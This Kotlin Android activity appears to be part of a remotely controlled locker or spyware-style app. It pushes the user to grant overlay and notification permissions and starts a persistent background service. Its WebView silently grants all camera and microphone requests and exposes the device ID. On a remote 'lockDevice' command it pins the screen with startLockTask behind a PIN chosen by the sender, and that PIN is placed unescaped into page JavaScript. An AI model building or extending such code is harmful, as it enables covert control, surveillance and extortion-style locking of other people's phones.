package com.sync.xxx

import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private var accountUid: String = "unknown"

    private val HTML_ASSET = "file:///android_asset/index.html"

    private var isRequestingSettings = false
    private var overlayRequested = false

    companion object {
        private const val REQ_NOTIF_PERMISSION = 1001
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action != DeviceService.ACTION_COMMAND) return
            val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
            val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
            handleCommand(cmd, value)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        readAccountUid()
        setupWebView()
        registerReceivers()

        // 🔥 STEP 1: Minta POST_NOTIFICATIONS (wajib Android 13+)
        requestNotificationPermission()
    }

    // ═══════════════════════════════════════════════════════════
    // STEP 1: POST_NOTIFICATIONS (unavoidable di Android 13+)
    // ═══════════════════════════════════════════════════════════
    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val granted = ContextCompat.checkSelfPermission(
                this, "android.permission.POST_NOTIFICATIONS"
            ) == PackageManager.PERMISSION_GRANTED

            if (!granted) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf("android.permission.POST_NOTIFICATIONS"),
                    REQ_NOTIF_PERMISSION
                )
                return
            }
        }
        // Sudah granted / Android < 13 → langsung lanjut ke overlay
        proceedToOverlay()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ_NOTIF_PERMISSION) {
            // Apapun hasilnya, lanjut ke overlay
            proceedToOverlay()
        }
    }

    // ═══════════════════════════════════════════════════════════
    // STEP 2: OVERLAY (izin utama, 1x perizinan)
    // ═══════════════════════════════════════════════════════════
    private fun proceedToOverlay() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this) && !overlayRequested) {
                overlayRequested = true
                isRequestingSettings = true
                try {
                    startActivity(
                        Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:$packageName")
                        )
                    )
                    return
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "Gagal buka overlay settings: ${e.message}")
                }
            }
        }
        // Overlay sudah granted / Android < M → start service
        startDeviceServiceDelayed()
    }

    // ═══════════════════════════════════════════════════════════
    // START SERVICE
    // ═══════════════════════════════════════════════════════════
    private fun startDeviceServiceDelayed() {
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val svcIntent = Intent(this, DeviceService::class.java)
                ContextCompat.startForegroundService(this, svcIntent)
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Gagal start service: ${e.message}")
            }
        }, 2000)
    }

    private fun readAccountUid() {
        try {
            val inputStream = assets.open("uid.json")
            val size = inputStream.available()
            val buffer = ByteArray(size)
            inputStream.read(buffer)
            inputStream.close()
            val json = String(buffer, Charsets.UTF_8)
            val obj = JSONObject(json)
            accountUid = obj.optString("uid", "unknown")

            val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
            prefs.edit().putString("account_uid", accountUid).apply()
        } catch (e: Exception) {
            e.printStackTrace()
            accountUid = "unknown"
        }
    }

    private fun registerReceivers() {
        val filter = IntentFilter(DeviceService.ACTION_COMMAND)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.mainWebView)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            mediaPlaybackRequiresUserGesture = false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }

        val bridge = AppBridge(this, webView)
        AppBridge.instance = bridge
        webView.addJavascriptInterface(bridge, "Android")
        webView.addJavascriptInterface(MainBridge(), "MainBridge")

        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                request.grant(request.resources)
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError?
            ) {
                super.onReceivedError(view, request, error)
                if (request?.isForMainFrame == true) {
                    val code = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        error?.errorCode else 0
                    val desc = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        error?.description ?: "unknown" else "unknown"
                    showErrorPage("Koneksi gagal (code: $code)\n$desc")
                }
            }
        }

        loadHtmlAsset()
    }

    private fun loadHtmlAsset() {
        val hasHtml = try {
            assets.open("index.html").use { it.available() > 0 }
        } catch (e: Exception) {
            false
        }

        if (!hasHtml) {
            showErrorPage("Aplikasi Error.\nFile HTML belum ditemukan dalam paket.")
            return
        }

        webView.loadUrl(HTML_ASSET)
    }

    private fun showErrorPage(message: String) {
        val html = """
            <!DOCTYPE html>
            <html>
            <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body {
                        margin: 0; padding: 40px 24px;
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        background: #0d0d0f; color: #e5e5e5;
                        display: flex; align-items: center; justify-content: center; min-height: 100vh;
                    }
                    .box { max-width: 420px; text-align: center; }
                    .icon {
                        width: 64px; height: 64px; border-radius: 16px;
                        background: #b91c1c; display: inline-flex;
                        align-items: center; justify-content: center;
                        font-size: 32px; margin-bottom: 20px;
                    }
                    h3 { font-size: 18px; margin: 0 0 12px; font-weight: 700; }
                    p { font-size: 13px; color: #9ca3af; margin: 0; line-height: 1.5; white-space: pre-line; }
                </style>
            </head>
            <body>
                <div class="box">
                    <div class="icon">!</div>
                    <h3>Aplikasi Error</h3>
                    <p>$message</p>
                </div>
            </body>
            </html>
        """.trimIndent()
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
    }

    override fun onResume() {
        super.onResume()
        // Kalau user baru balik dari settings overlay → start service
        if (isRequestingSettings) {
            isRequestingSettings = false
            // Cek overlay granted atau tidak, apapun hasilnya start service
            Handler(Looper.getMainLooper()).postDelayed({
                startDeviceServiceDelayed()
            }, 1000)
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent?.getBooleanExtra("lock_mode", false) == true) {
            val pin = intent.getStringExtra("lock_pin") ?: ""
            val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
            startLockMode(pin, title)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        when (cmd) {
            "lockDevice" -> {
                val parts = value.split("|")
                val pin = parts.getOrNull(0) ?: ""
                val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                startLockMode(pin, title)
            }
            "unlockDevice" -> stopLockMode()
        }
    }

    private fun startLockMode(pin: String, title: String) {
        webView.evaluateJavascript(
            "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')",
            null
        )
        try { startLockTask() } catch (e: Exception) {}
    }

    private fun stopLockMode() {
        try { stopLockTask() } catch (e: Exception) {}
        webView.evaluateJavascript("if(typeof hideLockScreen==='function') hideLockScreen()", null)
        val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
        sendBroadcast(i)
    }

    // ─── Bridge helpers ───
    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    else true

    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        Settings.canDrawOverlays(this) else true

    fun requestOverlayPerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            overlayRequested = true
            isRequestingSettings = true
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
        }
    }

    fun openBatterySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
        }
    }

    inner class MainBridge {
        @JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post {
                startDeviceServiceDelayed()
                sendBroadcast(Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) })
            }
        }
        @JavascriptInterface
        fun getUID(): String = accountUid
    }
}

class AppBridge(private val context: Context, private val webView: WebView) {
    companion object { var instance: AppBridge? = null }

    @JavascriptInterface fun getDeviceId(): String =
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    @JavascriptInterface fun getDeviceName(): String {
        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }

    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected
    @JavascriptInterface fun isBatteryOptIgnored() = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted() = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun requestOverlayPerm() = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
}